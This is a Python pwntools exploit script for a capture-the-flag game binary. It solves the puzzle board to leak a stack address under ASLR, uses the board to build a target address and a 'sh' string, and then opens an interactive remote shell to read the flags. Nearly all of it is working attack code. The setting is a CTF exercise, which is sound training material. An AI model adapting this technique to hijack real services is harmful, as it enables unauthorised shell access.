import sys

# to prevent pwntools from not displaying lines
# ending in \r in interactive()
sys.argv.append("NOTERM")

from pwn import *
import warnings
import time

warnings.simplefilter("ignore", category=BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("game-distr.out")

KEKE_SYMBOL = b"\xe2\x8c\xa5".decode()

p = None
def start():
	global p
	with context.local(log_level="error"):
		if p:
			p.close()
		if args.REMOTE:
			p = remote("127.0.0.1", 5000)
		else:
			p = elf.process()
			# p = elf.process(env={"LD_PRELOAD":"./preload.so"})	# disable the alarm timeout for debugging

# gdb.attach(p)
# pause()

# receive the game board
def recv_board():
	p.recvuntil(b"hacker is u")
	p.recvline()
	p.recvline()
	res = b""
	for i in range(32):
		res += p.recvline()
	p.recvline()
	return res.decode().replace("\r", "")

# perform one single move and return the board after that
def move_online(direction):
	p.sendline(direction)
	return recv_board()

# save the move in a buffer to be sent in the end in an offline manner.
# we use this in remote mode to send all moves at once and reduce
# interaction time with server to prevent timing out.
moves_buffer = ""
def move_offline(direction):
	global moves_buffer
	moves_buffer += direction
	return None

# determine move function based on the target being remote or local
move = (move_offline if args.REMOTE else move_online)

# perform a series of moves and return the final board state
def move_all(moves):
	return list(map(move, list(moves)))[-1]

# just get flag0 by escaping the first closed area
def get_flag0():
	global move
	move = move_online	# this is a rather short process so no need for move buffering
	start()
	recv_board()
	print(move_all("d" * 12 + "s" * 6 + "dassdw"))	# kekeispush => kekeisu
	print(move_all("a" * 15 + "s" * 8))	# get baba and keke in the same cell
	print(move_all("w" + "d" * 17 + "s" * 2))	# reach the exit of the first closed area
	p.sendline("s")	# move to the first flag cell
	log.success("flag0 = " + repr(p.recvline()))

# get a shell!
def get_shell():
	# try re-launching the process until the stack address on the game board
	# matches our needed conditions thanks to ASLR.
	tries = 0
	while True:
		tries += 1
		start()
		stack_leak = int(recv_board().splitlines()[23][20:56].replace(" ", ""), 16)
		if ("c" in hex(stack_leak) and "8" in hex(stack_leak) and hex(stack_leak).count("6") >= 2):
			break
	log.success("stack_leak = " + hex(stack_leak))
	log.success("Tries = " + str(tries))

	# escape the first area and get prepared to contruct the target address
	print(move_all("d" * 12 + "s" * 6 + "dassdw"))	# kekeispush => kekeisu
	print(move_all("a" * 15 + "s" * 8))	# join baba & keke
	print(move_all("w" + "d" * 17 + "s" * 3))	# escape first closed area
	print(move_all("a" * 11 + "ss"))	# disable 'XatY' phrase for now
	print(move_all("ww" + "d" * 13 + "w" * 18 + "d" * 5 + "ss"))	# fix digitispush
	print(move_all("d" + "s" * 17))	# move to the height level of XatY phrase

	# costruct the target address
	target_addr = "0x660bc8"[::-1]
	current_addr = (list("babaa ") + list(hex(stack_leak)))[::-1]
	for digit in target_addr:
		move_all("a" * (5 + current_addr.index(digit)))
		current_addr[current_addr.index(digit)] = 0
		move_all("s" * 6 + "as" + "d" * 20)
		print(move_all("w" + "d" * len(target_addr) + "w" * 5))
	
	# write 'shat' at the left side of the target address
	print(move_all("w" * 6 + "adwad" + "w" * 10 + "aa"))	# move 'sh' out of digitispush
	print(move_all("s" * 20 + "dsawasdds" + "a" * 19))	# move 'sh' to the left of the board
	print(move_all("w" + "a" * 5 + "w" * 4 + "d" * 5 + "s" * 4))	# bring 'a' next to 'sh'
	print(move_all("w" + "a" * 6 + "w" * 4 + "d" * 6 + "s" * 5))	# bring 't' next to 'sh'
	print(move_all("swa" * 4 + "ss"))	# ready to move 'shat' next to the target address!
	print(move_all("d" * 11 + "a"))	# make 'shat<target_addr>'

	# send all the buffered moves at once in remote mode
	if (args.REMOTE):
		p.sendline(moves_buffer)
		for i in range(len(moves_buffer)):
			print("receiving program output: %d/%d\r" % (i, len(moves_buffer)), end = "")
			recv_board()

# get_flag0()
get_shell()

log.info("Waiting 20s for alarmHandler to be called...")
time.sleep(20)	# wait for alarmHandler() in target to be called
p.interactive()
# Use `python exploit.py REMOTE | tee output.txt` and then enter the command
# `cat game-distr.out` into the remote shell. Then use the command
# `strings --encoding=B output.txt` on the captured output to read both flags in program memory
